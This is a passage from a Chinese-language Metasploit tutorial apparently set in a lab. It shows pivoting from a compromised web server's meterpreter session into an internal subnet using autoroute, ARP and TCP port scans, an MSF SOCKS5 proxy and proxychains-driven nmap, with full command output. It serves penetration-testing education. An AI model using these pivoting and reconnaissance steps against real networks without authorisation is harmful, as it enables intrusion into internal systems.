    Interface  1
    ============
    Name         : MS TCP Loopback interface
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 1520
    IPv4 Address : 127.0.0.1
    Interface 65539
    ============
    Name         : Intel(R) PRO/1000 MT Network Connection
    Hardware MAC : 00:0c:29:23:57:f3
    MTU          : 1500
    IPv4 Address : 192.168.9.50
    IPv4 Netmask : 255.255.255.0
    meterpreter >
添加内网路由并查看：（注意：该配置是在www服务器的meterpreter会话中配置的，而不是内网普通用户主机）
    meterpreter > run autoroute -s 192.168.9.0/24
    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    [*] Adding a route to 192.168.9.0/255.255.255.0...
    [+] Added route to 192.168.9.0/255.255.255.0 via 192.33.6.200
    [*] Use the -p option to list all active routes
    meterpreter > run autoroute -p
    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    Active Routing Table
    ====================
       Subnet             Netmask            Gateway
       ------             -------            -------       192.168.9.0        255.255.255.0      Session 3
    meterpreter >
  * 内网信息收集
内网信息收集：利用`arp_scanner`、`portscan`等脚本模块进行信息收集
对内网主机进行一个收集
    meterpreter > info post/windows/gather/arp_scanner
           Name: Windows Gather ARP Scanner
         Module: post/windows/gather/arp_scanner
       Platform: Windows
           Arch: 
           Rank: Normal
    Provided by:
      Carlos Perez 
    Compatible session types:
      Meterpreter
    Basic options:
      Name     Current Setting  Required  Description
      ----     ---------------  --------  -----------      RHOSTS                    yes       The target address range or CIDR identifier
      SESSION                   yes       The session to run this module on.
      THREADS  10               no        The number of concurrent threads
    Description:
      This Module will perform an ARP scan for a given IP range through a 
      Meterpreter Session.
    Module options (post/windows/gather/arp_scanner):
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------       RHOSTS                    yes       The target address range or CIDR identifier
       SESSION                   yes       The session to run this module on.
       THREADS  10               no        The number of concurrent threads
    meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.9.0/24 THREADS=50
    [*] Running module against SERVER
    [*] ARP Scanning 192.168.9.0/24
    [+]     IP: 192.168.9.50 MAC 00:0c:29:23:57:f3 (VMware, Inc.)
    [+]     IP: 192.168.9.101 MAC 00:0c:29:fb:6f:2e (VMware, Inc.)
    [+]     IP: 192.168.9.254 MAC 00:0c:29:8c:0f:e7 (VMware, Inc.)
    meterpreter >
对收集到的特定主机`192.168.9.101`进行端口扫描
    meterpreter > info auxiliary/scanner/portscan/tcp 
           Name: TCP Port Scanner
         Module: auxiliary/scanner/portscan/tcp
        License: Metasploit Framework License (BSD)
           Rank: Normal
    Provided by:
      hdm 
      kris katterjohn 
    Check supported:
      No
    Basic options:
      Name         Current Setting  Required  Description
      ----         ---------------  --------  -----------      CONCURRENCY  10               yes       The number of concurrent ports to check per host
      DELAY        0                yes       The delay between connections, per thread, in milliseconds
      JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
      PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
      RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
      THREADS      1                yes       The number of concurrent threads (max one per host)
      TIMEOUT      1000             yes       The socket connect timeout in milliseconds
    Description:
      Enumerate open TCP services by performing a full TCP connect on each 
      port. This does not need administrative privileges on the source 
      machine, which may be useful if pivoting.
    Module options (auxiliary/scanner/portscan/tcp):
       Name         Current Setting  Required  Description
       ----         ---------------  --------  -----------       CONCURRENCY  10               yes       The number of concurrent ports to check per host
       DELAY        0                yes       The delay between connections, per thread, in milliseconds
       JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
       PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
       RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
       THREADS      1                yes       The number of concurrent threads (max one per host)
       TIMEOUT      1000             yes       The socket connect timeout in milliseconds
    meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=192.168.9.101 THREADS=50 TIMEOUT=500 RPORTS=1-65535
    [+] 192.168.9.101:        - 192.168.9.101:139 - TCP OPEN
    [+] 192.168.9.101:        - 192.168.9.101:135 - TCP OPEN
    [+] 192.168.9.101:        - 192.168.9.101:445 - TCP OPEN
    [+] 192.168.9.101:        - 192.168.9.101:3389 - TCP OPEN
    meterpreter >
**系统代理+内网收集**
实战：配置系统代理，对内网进行信息收集（前提：在www服务器的meterpreter会话中已配置内网的路由转发功能）
  * socks5系统代理
在MSF中设置并启动本地系统代理：`127.0.0.1:1080`
    msf5 > use auxiliary/server/socks5 
    msf5 auxiliary(server/socks5) > show options 
    Module options (auxiliary/server/socks5):
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------       PASSWORD                   no        Proxy password for SOCKS5 listener
       SRVHOST   0.0.0.0          yes       The address to listen on
       SRVPORT   1080             yes       The port to listen on
       USERNAME                   no        Proxy username for SOCKS5 listener
    Auxiliary action:
       Name   Description
       ----   -----------       Proxy  Run SOCKS5 proxy
    msf5 auxiliary(server/socks5) > set SRVHOST 127.0.0.1
    SRVHOST => 127.0.0.1
    msf5 auxiliary(server/socks5) > show options 
    Module options (auxiliary/server/socks5):
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------       PASSWORD                   no        Proxy password for SOCKS5 listener
       SRVHOST   127.0.0.1        yes       The address to listen on
       SRVPORT   1080             yes       The port to listen on
       USERNAME                   no        Proxy username for SOCKS5 listener
    Auxiliary action:
       Name   Description
       ----   -----------       Proxy  Run SOCKS5 proxy
    msf5 auxiliary(server/socks5) > 
    msf5 auxiliary(server/socks5) > run
    [*] Auxiliary module running as background job 0.
    [*] Starting the socks5 proxy server
    msf5 auxiliary(server/socks5) >
然后，在本地配置proxychains软件代理，使得proxychains代理的流量由MSF代理请求转发
     → Qftm :~/Desktop# vim /etc/proxychains.conf
    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    socks5     127.0.0.1 1080
  * 内网信息收集
使用已配置的proxychains代理工具进行协助对内网进行信息收集
     → Qftm :~/Desktop# proxychains nmap -Pn -sT 192.168.9.101
    ProxyChains-3.1 (http://proxychains.sf.net)
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-25 10:20 EDT
    |S-chain|-<>-127.0.0.1:1080-<><>-192.168.9.101:256--127.0.0.1:1080-<><>-192.168.9.101:8080--127.0.0.1:1080-<><>-192.168.9.101:554--127.0.0.1:1080-<><>-192.168.9.101:1720--127.0.0.1:1080-<><>-192.168.9.101:110--127.0.0.1:1080-<><>-192.168.9.101:135-<><>-OK
    |S-chain|-<>-127.0.0.1:1080-<><>-192.168.9.101:5900--127.0.0.1:1080-<><>-192.168.9.101:199--127.0.0.1:1080-<><>-192.168.9.101:21--127.0.0.1:1080-<><>-192.168.9.101:8888--127.0.0.1:1080-<><>-192.168.9.101:80--127.0.0.1:1080-<><>-192.168.9.101:3389-<><>-OK
    |S-chain|-<>-127.0.0.1:1080-<><>-192.168.9.101:111--127.0.0.1:1080-<><>-192.168.9.101:139-<><>-OK
    |S-chain|-<>-127.0.0.1:1080-<><>-192.168.9.101:3306--127.0.0.1:1080-<><>-192.168.9.101:143--127.0.0.1:1080-<><>-192.168.9.101:443--127.0.0.1:1080-<><>-192.168.9.101:23--127.0.0.1:1080-<><>-192.168.9.101:587--127.0.0.1:1080-<><>-192.168.9.101:113--127.0.0.1:1080-<><>-192.168.9.101:995--127.0.0.1:1080-<><>-192.168.9.101:53--127.0.0.1:1080-<><>-192.168.9.101:25--127.0.0.1:1080-<><>-192.168.9.101:993--127.0.0.1:1080-<><>-192.168.9.101:1025--127.0.0.1:1080-<><>-192.168.9.101:22--127.0.0.1:1080-<><>-192.168.9.101:445-<><>-OK
    |S-chain|-<>-127.0.0.1:1080-<><>-192.168.9.101:1723--127.0.0.1:1080-<><>-192.168.9.101:3920--127.0.0.1:1080-<><>-192.168.9.101:2393--127.0.0.1:1080-<><>-192.168.9.101:49160--127.0.0.1:1080-<><>-192.168.9.101:49167--127.0.0.1:1080-<><>-192.168.9.101:1433-<--timeout
## Refference
  * 《Metasploit渗透测试魔鬼训练营》
  * [msfconsole-commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
  * [Alternative methods of becoming SYSTEM](https://blog.xpnsec.com/becoming-system/)
  * [Multiple Ways to Bypass UAC using Metasploit](https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/)
  * [Exploring Mimikatz – Part 1 – WDigest](https://blog.xpnsec.com/exploring-mimikatz-part-1/)
  * [List of Metasploit Commands – Cheatsheet](https://thehacktoday.com/metasploit-commands/)
  * [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
  * [metasploit-unleashed](https://www.offensive-security.com/metasploit-unleashed/)